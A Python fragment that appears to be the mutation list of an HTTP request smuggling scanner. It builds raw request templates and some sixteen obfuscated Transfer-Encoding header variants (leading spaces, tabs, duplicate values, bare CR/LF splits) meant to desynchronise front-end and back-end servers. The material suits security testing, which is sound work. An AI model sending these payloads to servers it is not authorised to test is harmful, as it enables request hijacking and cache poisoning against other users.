
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p

mutations["vanilla"] = render_template("Transfer-Encoding: chunked")

mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")
mutations["nospace1"] = render_template("Transfer-Encoding:chunked")
mutations["connection"] = render_template("Connection: Transfer-Encoding\r\nTransfer-Encoding: chunked")
mutations["backslash"] = render_template("Transfer\\Encoding: chunked")

mutations["commaCow"] = render_template("Transfer-Encoding: chunked, cow")
mutations["cowComma"] = render_template("Transfer-Encoding: cow, chunked")
mutations["revdualchunk"] = render_template("Transfer-Encoding: cow\r\nTransfer-Encoding: chunked")
mutations["dualchunk"] = render_template("Transfer-Encoding: chunked\r\nTransfer-encoding: identity")

mutations["badsetupCR"] = render_template("Foo: bar\rTransfer-Encoding: chunked")
mutations["badsetupLF"] = render_template("Foo: bar\nTransfer-Encoding: chunked")
mutations["0dwrap"] = render_template("Foo: bar\r\n\rTransfer-Encoding: chunked")
mutations["bodysplit"] = render_template("Foo: bar\n\nTransfer-Encoding: chunked")
